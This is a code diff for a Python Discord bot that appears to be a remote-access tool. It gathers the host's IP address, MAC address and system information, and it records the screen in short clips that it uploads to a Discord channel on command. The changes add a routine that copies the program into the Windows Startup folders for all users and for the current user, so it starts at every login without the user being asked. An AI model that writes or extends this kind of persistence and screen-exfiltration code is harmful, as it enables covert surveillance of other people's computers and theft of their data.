@@ -1,4 +1,5 @@
 import os
+import sys
 import uuid
 import json
 import shutil
@@ -31,6 +32,9 @@ intents.message_content = True # Allow bot to read messages from discord channel
 intents.guilds = True # Enables interaction with discord server
 bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix
 
+#screen recording vars
+recording_task = None
+
 # Functions
 def get_ip_address():
     # Function to get the local machine's IP address
@@ -51,10 +55,76 @@ def get_mac_address():
     except Exception as e: # error handling for getting the mac-address
         return f"Error getting MAC address: {e}"
 
+def copy_to_start(program_to_copy):
+    try:
+        a_users = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        c_user = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+
+        os.makedirs(a_users, exist_ok=True)
+        os.makedirs(c_user, exist_ok=True)
+        try:
+            shutil.copy2(program_to_copy, a_users)
+            print(f"Successfully copied to: {a_users}")
+        except Exception as e:
+            print("All user error:", e)
+        try:
+            shutil.copy2(program_to_copy, c_user)
+            print(f"Successfully copied to: {c_user}")
+        except Exception as e:
+            print("Current user error:", e)
+
+    except Exception as e:
+        print(f"There has been an error:\n{e}")
+        os.system("pause")
+
+
 async def main_loop():
     while True:
         print("Hallo")
         await asyncio.sleep(5)
+
+async def record_screen(ctx, rec: bool):
+    try:
+        # Define the output file name with a timestamp
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"screen_recording_{timestamp}.mp4"
+
+        # Record the screen continuously in a loop until rec is False
+        fps = 12  # Frames per second
+        duration = 3  # Duration in seconds
+        frames = []
+
+        while rec:  # Loop to keep recording as long as rec is True
+            frames.clear()  # Clear the frames list for the next batch of frames
+
+            for _ in range(fps * duration):
+                if not rec:
+                    break
+
+                screenshot = pyautogui.screenshot()
+                # Convert the screenshot to a numpy array
+                frame = np.array(screenshot)
+                frames.append(frame)
+                await asyncio.sleep(1 / fps)
+
+            if frames:
+                # Save frames as a video using imageio
+                with imageio.get_writer(output_file, fps=fps) as writer:
+                    for frame in frames:
+                        writer.append_data(frame)
+
+                # Send the recorded video to Discord
+                with open(output_file, "rb") as video_file:
+                    await ctx.send(file=discord.File(video_file, output_file))
+
+                # Optional: you can clean up the recorded file after sending it
+                os.remove(output_file)
+
+    except asyncio.CancelledError:
+        # Handle the task cancellation gracefully
+        await ctx.send("Recording was cancelled.")
+    except Exception as e:
+        await ctx.send(f"❌ Error recording screen: {str(e)}")
 
 @bot.command()
 async def what(ctx):
@@ -198,8 +268,6 @@ async def getsysinfo(ctx):
     except Exception as e:
         return {"Error": f"Error getting system info: {e}"}
     
-recording_task = None  # This will store the current recording task
-
 @bot.command()
 async def screen(ctx, action: str):
     global recording_task  # To access the global task variable
@@ -232,51 +300,6 @@ async def screen(ctx, action: str):
 
     except Exception as e:
         await ctx.send(f"❌ Error: {str(e)}")
-
-
-async def record_screen(ctx, rec: bool):
-    try:
-        # Define the output file name with a timestamp
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        output_file = f"screen_recording_{timestamp}.mp4"
-
-        # Record the screen continuously in a loop until rec is False
-        fps = 12  # Frames per second
-        duration = 3  # Duration in seconds
-        frames = []
-
-        while rec:  # Loop to keep recording as long as rec is True
-            frames.clear()  # Clear the frames list for the next batch of frames
-
-            for _ in range(fps * duration):
-                if not rec:
-                    break
-
-                screenshot = pyautogui.screenshot()
-                # Convert the screenshot to a numpy array
-                frame = np.array(screenshot)
-                frames.append(frame)
-                await asyncio.sleep(1 / fps)
-
-            if frames:
-                # Save frames as a video using imageio
-                with imageio.get_writer(output_file, fps=fps) as writer:
-                    for frame in frames:
-                        writer.append_data(frame)
-
-                # Send the recorded video to Discord
-                with open(output_file, "rb") as video_file:
-                    await ctx.send(file=discord.File(video_file, output_file))
-
-                # Optional: you can clean up the recorded file after sending it
-                os.remove(output_file)
-
-    except asyncio.CancelledError:
-        # Handle the task cancellation gracefully
-        await ctx.send("Recording was cancelled.")
-    except Exception as e:
-        await ctx.send(f"❌ Error recording screen: {str(e)}")
-
 
 @bot.event
 async def on_ready():
@@ -343,6 +366,8 @@ async def on_disconnect():
 
 # Run the bot securely
 if TOKEN:
+    program_path = os.path.abspath(sys.argv[0])
+    copy_to_start(program_path)
     bot.run(TOKEN)
 else:
     print("❌ Bot token is missing! Set the DISCORD_BOT_TOKEN environment variable.")
